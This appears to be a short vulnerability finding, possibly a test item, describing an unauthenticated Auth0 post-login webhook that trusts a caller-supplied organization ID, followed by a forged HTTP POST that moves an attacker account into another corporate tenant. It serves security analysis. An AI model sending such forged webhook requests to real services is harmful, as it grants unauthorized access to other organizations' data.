diagnosis: The Auth0 post-login Action webhook receiver updates the user's active tenant binding in the application database using target_organization_id supplied directly in the webhook payload without verifying the webhook signature or checking whether the user was invited to target_organization_id. An attacker can forge webhook calls to switch their account into any corporate tenant.
exploit_request:
POST /api/webhooks/auth0/post-login HTTP/1.1
Host: idp.portal.internal:9001
Content-Type: application/json

{
  "user_id": "auth0|attacker_account_01",
  "target_organization_id": "org_enterprise_hq_global",
  "connection": "Username-Password-Authentication"
}
